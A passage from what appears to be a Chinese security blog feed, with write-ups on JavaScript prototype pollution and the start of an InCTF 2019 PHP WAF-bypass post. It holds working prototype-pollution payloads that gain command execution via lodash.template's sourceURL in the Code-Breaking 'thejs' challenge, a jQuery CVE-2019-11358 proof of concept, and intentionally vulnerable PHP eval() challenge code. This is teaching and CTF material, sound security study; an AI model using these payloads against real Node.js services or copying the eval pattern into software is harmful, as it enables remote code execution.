key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其在合并的过程中，存在赋值的操作target[key] = source[key]。因此，当我们控制target的键key为__proto__时就能污染原型链了。</p><p>先试下这个payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>可以看到并未污染成功：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/13.png" alt=""></p><blockquote><p>这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “<strong>proto</strong>“: {b: 2}}）中，<strong>proto</strong>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，<strong>proto</strong>并不是一个key，自然也不会修改Object的原型。</p></blockquote><p>因此，我们需要将o2实例对象那部分改为Json格式，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>可以看到新建的o3实例对象也存在b属性，说明Object已经被污染了，这样就能成功进行原型链污染攻击了：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/14.png" alt=""></p><blockquote><p>这是因为，JSON解析的情况下，<strong>proto</strong>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p></blockquote><h2 id="0x03-Code-Breaking-2018-Thejs"><a href="#0x03-Code-Breaking-2018-Thejs" class="headerlink" title="0x03 Code-Breaking 2018 Thejs"></a>0x03 Code-Breaking 2018 Thejs</h2><p>这是P神在代码审计中出的一道JS原型链污染题目。</p><p>题目环境：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>访问页面，就是让你选两个项，添加之后就会缓存起来：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/15.png" alt=""></p><p>Add请求报文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://test.com/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: grafana_session=37dd397e606027a65d2179c6a4d00d80</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">language%5B%5D=php&amp;category%5B%5D=web</span><br></pre></td></tr></table></figure><p>这题是需要进行代码审计的。</p><p>这里主要的代码都在server.js中，我们看其中关键部分：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到，这里存在一个用户输入点<code>lodash.merge(data, req.body)</code>，即在请求方法为POST时直接将req.body的值作为lodash.merge()的第二个参数传入，而我们在前面知道merge()函数是合并数组的操作，同时也是原型链污染的常见场景，因此我们可以通过POST方式传入的请求体内容来污染data数组。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。</p><p>我们去看下<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>的源码吧：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>options是一个对象，sourceURL取到了其options.sourceURL属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个sourceURL被拼接进new Function的第二个参数中，造成任意代码执行漏洞。</p></blockquote><p>了解一下，Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/16.png" alt=""></p><p>而Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/17.png" alt=""></p><p>再看下attempt是干啥的，在<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/attempt.js" target="_blank" rel="noopener">attemp.js</a>中有定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>说到底attempt就是<code>func.apply()</code>，就是执行定义的函数。</p><p>那么options是怎么传进来的？我们回到server.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line"><span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br></pre></td></tr></table></figure><p>这里三个点是将options数组打散为序列的意思。到这我们还是不能确定options是否可控，但这没必要去考虑，因为我们通过原型链污染来污染Object.sourceURL，致使在寻找options.sourceURL时JS引擎还是能成功在options的原型链上找到该属性。</p><p>至此，也就是说，当我们通过原型链污染致使options.sourceURL存在值时，程序会将options.sourceURL污染值拼接到Function()的第二个参数中，导致任意代码执行。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="缺陷payload"><a href="#缺陷payload" class="headerlink" title="缺陷payload"></a>缺陷payload</h4><p>根据上述分析，可以通过原型链污染致使Object存在污染进来的sourceURL属性，从而导致options也有sourceURL属性进而任意代码执行。</p><p>下面这个是有缺陷的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\nreturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('ls /')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里<code>e =&gt; { return ...}</code>是ES6的匿名函数创建语法，相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function(e)&#123; return ...;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p></blockquote><p>发送前，注意Content-Type改为application/json：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/18.png" alt=""></p><p>虽然能执行命令拿到flag，但是Web页面不能再直接访问了。这是因为只要在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务。</p><h4 id="优化payload"><a href="#优化payload" class="headerlink" title="优化payload"></a>优化payload</h4><p>在上一个基础上，在执行本次命令之前用for循环把之前的污染删掉：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\nreturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag_thepr0t0js')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>此时的Web服务能正常访问。</p><h2 id="0x04-jQuery原型污染漏洞（CVE-2019-11358）"><a href="#0x04-jQuery原型污染漏洞（CVE-2019-11358）" class="headerlink" title="0x04 jQuery原型污染漏洞（CVE-2019-11358）"></a>0x04 jQuery原型污染漏洞（CVE-2019-11358）</h2><p>在jQuery &lt; 3.4.0的版本中存在原型污染漏洞。</p><p>下面参考奇安信的漏洞分析。</p><p>在./src/core.js第155行中，options取传入的参数 arguments[i]：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((options = <span class="built_in">arguments</span>[ i ]) != <span class="literal">null</span>) &#123;</span><br></pre></td></tr></table></figure><p>而后在第158 、159 行中，将options遍历赋值给copy，即copy外部可控：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (name <span class="keyword">in</span> options) &#123;    copy= options [name];</span><br></pre></td></tr></table></figure><p>接着，在第167-185行中，判断copy是否是数组；若是，则调用jQuery.extend()函数，该函数用于将一个或多个对象的内容合并到目标对象，这里是将外部可控的copy数组扩展到target数组中；若copy非数组而是个对象，则直接将copy变量值赋值给target[name]：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Recurse if we're merging plain objects or arraysif ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) || ( copyIsArray = Array.isArray( copy ) ) ) ) &#123;    ...    // Never move original objects, clone them    target[ name ] = jQuery.extend( deep, clone, copy );    // Don't bring in undefined values&#125; else if ( copy !== undefined ) &#123;    target[ name ] = copy;&#125;</span></span><br></pre></td></tr></table></figure><p>此时，如果name可以被设置为<code>__proto__</code>，则会向上影响target的原型，进而覆盖造成原型污染。</p><p>往前面找，在第127行中可以看到，target数组是取传入的参数arguments[0]：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">arguments</span>[ <span class="number">0</span> ] || &#123;&#125;,</span><br></pre></td></tr></table></figure><p>也就是说，target变量可以通过外部传入的参数arguments数组的第一个元素来设置target数组的键name对应的值为<code>__proto__</code>，而options变量可通过外部传入的参数arguments[i]进行赋值，copy变量又是由options遍历赋值的，进而导致copy变量外部可控，最后会将copy合入或赋值到target数组中，因此当<code>target[__proto__]=外部可控的copy</code>时就存在原型污染漏洞了。</p><p>简单地说，就是target[name]=copy的赋值语句两边均可控，导致JS原型污染漏洞的存在。</p><p>因此可以构造如下PoC来验证，先引入漏洞版本的jQuery，再进行JS原型污染攻击：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jquery = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  jquery.src = <span class="string">'https://code.jquery.com/jquery-3.3.1.min.js'</span>;<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(jquery);<span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode":"Hacked By Mi1k7ea"&#125;&#125;'</span>))<span class="built_in">console</span>.log(&#123;&#125;.devMode);</span><br></pre></td></tr></table></figure><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/3.png" alt=""></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a></p><p><a href="https://www.smi1e.top/javascript-原型链污染/" target="_blank" rel="noopener">JavaScript 原型链污染</a></p><p><a href="https://anemone.top/JS-原型链污染/" target="_blank" rel="noopener">JavaScript原型链污染学习笔记</a></p><p><a href="https://www.anquanke.com/post/id/176884" target="_blank" rel="noopener">JavaScript 原型链污染</a></p><p><a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>InCTF 2019 PHP+1,+1.5,+2.5三题复现</title>
    <link href="https://www.mi1k7ea.com/2019/10/20/InCTF-2019-PHP%E4%B8%89%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.mi1k7ea.com/2019/10/20/InCTF-2019-PHP三题复现/</id>
    <published>2019-10-20T03:01:43.000Z</published>
    <updated>2019-10-20T05:47:36.474Z</updated>
    
    <content type="html"><![CDATA[<p>这里复现下InCTF 2019 PHP+1,+1.5,+2.5这三道PHP的题目，考点是绕过WAF和disable_functions。</p><h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>这三道题都是PHP代码审计题目，三题之间层层递进，区别在于自身写的WAF越来越严格地进行了过滤。</p><p>先分别看看三个题目的源码。</p><h3 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP+1"></a>PHP+1</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP+1</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，漏洞代码就是<code>eval($input);</code>，这里我们可以传入两个参数：input和thisfile。</p><p>input参数：在eval执行input参数值之前，会经过check()函数的检测过滤处理。</p><p>thisfile参数：会经过is_file()函数和file_existes()函数过滤；若调用is_file()函数判断输入参数值是文件则无法进入漏洞代码逻辑；若调用file_existes()函数判断该文件不存在，则同样无法进入漏洞代码逻辑；但这里我们可以通过传入一个已存在的目录路径来绕过这两个函数的检测；而绕过这两个函数之后，就是绕过check()函数的问题了。</p><p>check()函数：先调用<code>get_defined_functions()[&#39;internal&#39;]</code>来获取系统内置函数作为黑名单，然后将该黑名单函数作为正则匹配input参数值进行检测，若匹配成功则返回true、不仅如此后续eval的漏洞代码逻辑；若匹配失败则返回false、进入漏洞代码逻辑。</p><h3 id="PHP-1-5"><a href="#PHP-1-5" class="headerlink" title="PHP+1.5"></a>PHP+1.5</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php+1.5</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $input)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和PHP+1相比，区别在于多了个黑名单正则<code>/exit|die|eval|\[|\]|\\\|\*|</code>|-|+|~|{|}|\”|\’/i`来匹配过滤input参数值，即将eval、die、exit（这几个不算PHP函数）及其他一些特殊字符进行了过滤，提高了利用的门槛。</p><h3 id="PHP-2-5"><a href="#PHP-2-5" class="headerlink" title="PHP+2.5"></a>PHP+2.5</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td 